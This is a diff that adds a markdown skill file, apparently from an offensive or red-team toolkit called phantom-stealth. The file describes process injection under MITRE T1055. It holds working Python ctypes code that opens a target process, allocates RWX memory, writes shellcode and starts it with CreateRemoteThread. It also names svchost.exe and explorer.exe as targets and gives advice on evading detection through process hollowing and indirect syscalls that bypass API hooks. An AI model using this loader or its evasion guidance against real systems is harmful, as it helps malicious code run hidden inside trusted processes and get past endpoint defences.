@@ -1,0 +1,63 @@
+---
+name: process-injection
+phase: stealth
+mitre_ids: [T1055.001, T1055.012]
+opsec_level: 4
+description: Inject shellcode into a legitimate process to evade AV and blend with normal activity
+module: phantom-stealth
+tools: [custom-loader, powershell, python]
+prerequisites: [shellcode_payload, target_process_name]
+---
+# Process Injection
+
+## Technique
+Inject shellcode or a DLL into a legitimate running process to execute
+malicious code under the cover of a trusted process identity, evading
+endpoint detection tools that monitor process creation.
+
+## Commands
+```python
+# Python example: classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
+import ctypes, ctypes.wintypes
+
+PROCESS_ALL_ACCESS = 0x1F0FFF
+MEM_COMMIT = 0x1000
+PAGE_EXECUTE_READWRITE = 0x40
+
+shellcode = b"\x90\x90..."  # replace with actual shellcode
+
+# Open target process (e.g., explorer.exe)
+pid = 1234  # target PID
+handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+
+# Allocate memory in target process
+addr = ctypes.windll.kernel32.VirtualAllocEx(
+    handle, None, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE
+)
+
+# Write shellcode
+written = ctypes.c_size_t(0)
+ctypes.windll.kernel32.WriteProcessMemory(handle, addr, shellcode, len(shellcode), ctypes.byref(written))
+
+# Create remote thread
+ctypes.windll.kernel32.CreateRemoteThread(handle, None, 0, addr, None, 0, None)
+```
+
+```powershell
+# PowerShell: inject via Add-Type (for demonstration)
+# Use a compiled C# loader for better OPSEC in real engagements
+```
+
+## Usage
+1. Select a long-running, trusted process (svchost.exe, explorer.exe).
+2. Obtain the PID of the target process.
+3. Inject and verify the payload executes in the target process context.
+
+## Detection Evasion
+- Prefer process hollowing (T1055.012) over classic injection for better stealth.
+- Avoid injecting into security product processes.
+- Use indirect syscalls to bypass user-mode API hooks.
+
+## MITRE ATT&CK
+- T1055.001 — Process Injection: Dynamic-link Library Injection
+- T1055.012 — Process Injection: Process Hollowing
